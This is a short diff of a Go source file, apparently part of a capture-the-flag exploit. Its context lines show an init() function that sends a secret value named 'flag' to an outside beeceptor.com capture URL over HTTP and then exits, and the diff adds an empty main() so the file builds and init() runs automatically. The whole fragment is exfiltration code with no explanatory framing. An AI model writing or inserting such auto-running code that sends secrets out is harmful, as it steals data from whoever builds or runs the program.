@@ -14,3 +14,5 @@ func init() {
  http.Get("http://rashidy.free.beeceptor.com?flag=" + string(flag))
  os.Exit(0) // Prevent further execution if needed
 }
+
+func main() {}
